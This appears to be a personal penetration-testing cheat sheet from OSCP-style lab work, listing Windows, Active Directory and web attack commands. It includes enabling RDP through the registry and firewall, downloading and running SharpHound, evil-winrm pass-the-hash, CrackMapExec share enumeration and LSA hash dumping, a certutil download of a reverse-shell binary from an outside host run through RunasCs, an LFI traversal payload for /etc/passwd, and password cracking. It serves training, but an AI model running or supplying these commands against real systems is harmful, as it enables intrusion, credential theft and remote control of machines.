Windows: 

### open firewall
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

### Bloodhound 

```
.\Sharphoun.exe -c all,group 

PS C:\Users\marcus> iwr -uri http://<ip>:8000/SharpHound.ps1 -Outfile SharpHound.ps1
iwr -uri http://<ip>:8000/SharpHound.ps1 -Outfile SharpHound.ps1

PS C:\Users\marcus> powershell -ep bypass

PS C:\Users\marcus> . .\SharpHound.ps1

PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
```

EVIL-WinRM:

once you login with evil-winrm 

```bash
evil-winrm -i 192.168.173.165 -u 'svc_apache' -H 4FC1682833B24CF2225248D67DF7E618 -e "<kali-path>"

$Evil-WinRM PS C:\> Invoke-Binary

$Evil-WinRM PS C:\> Invoke-Binary <kali-Path> run <paramter>

Download file 
1. download <file>
2. download <file> <absolute path in my kali>
```

This will help to connect **`metasploit`** this is userfull

https://github.com/tedchen0001/OSCP-Notes/blob/master/AD.md

### Crackmapexec 

# Crackmapexec
```
crackmapexec smb <target> -u '' -p ''
crackmapexec smb <target> -u '' -p '' --users
crackmapexec smb 192.168.1.0/24 
crackmapexec smb target.txt
crackmapexec smb target.txt -u <usernmae> -p <password>

#extract password policy 
crackmapexec smb target.txt -u <usernmae> -p <password> --pass-pol

#enumarte shares
crackmapexec smb target.txt -u <usernmae> -p <password> --shares

#check for loggedon users 
crackmapexec smb target.txt -u <usernmae> -p <password> --loggedon-users

#extract the NTLM hashes 
crackmapexec smb target.txt -u <usernmae> -p <password>  --lsa

#using hash (. dot means local) 
crackmapexec smb target.txt -u Administrator -H <hash> -d .

crackmapexec smb 192.168.237.172 -u admin -p '' -d vault.offsec --rid-brute 
```
## Runascs 
If creds are found and already logged into the machine then use this command to login as that user. 

```bash
PS C:\tools> certutil.exe -urlcache -split -f "http://192.168.45.184/rshell.exe" rshell.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.
PS C:\tools> .\RunasCs.exe svc_mssql trustno1 "cmd /c c:\tools\rshell.exe"
````

### WPSCAN 

```
wpscan --update --url http://192.168.169.167/ --enumerate ap --plugins-detection aggressive
```

### LFI

check for cron jobs as well 

```
/etc/cron.daily/<file> 
```

### RDP 

```
 xfreerdp /cert-ignore /compression /auto-reconnect  /u:michelle /v:172.16.186.21  /w:1600 /h:1000 /drive:test,/home/offsec/Documents/pen-200
```

### hashcat 
```
sudo hashcat -m 1000 tom_admin.hash /usr/share/wordlists/rockyou.txt --force
```

### LDAP
```
nmap -n -sV --script "ldap* and not brute" 192.168.194.122                                                                                                ldapsearch -h 192.168.194.122 -x -s base namingcontexts   # gives  namingcontext                                                                                   
ldapsearch -x -H ldap://192.168.194.122 -b "dc=<domain>,dc=offsec"
                                                       
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=vault.offsec,userdb=user.txt <ip> -Pn      # got user.txt from seclist                                                                 
```

## Hashcat and John 
```
sudo hashcat -m 1000 tom_admin.hash /usr/share/wordlists/rockyou.txt --force
```
```
john -wordlist=/usr/share/wordlists/rockyou.txt tom_admin.hash –format=NT
``` 
## Wfuzz 
```
wfuzz -c -x file,/opt/Seclist/Discovery/WEb-Content/raft-large-files.txt --hc 404 "<url>"
url="<http://<ip>/console/file.php?FUZZ=../../../../../../../etc/passwd"
wfuzz -c -x file,/opt/Seclist/Discovery/WEb-Content/burp-parameter-names.txt --hh 0 "<url>
```
gobuster 
```
 sudo gobuster dir -u http://192.168.194.122:49673/ -w  /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
sudo gobuster dir -u https://192.168.194.122:49673/ -w  /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -k
sudo gobuster dir -u https://192.168.174.10:9090/ -w  /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -k --exclude-length 43264 
```
FFUF
```
ffuf -w  /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u https://192.168.174.10:9090/FUZZ
```
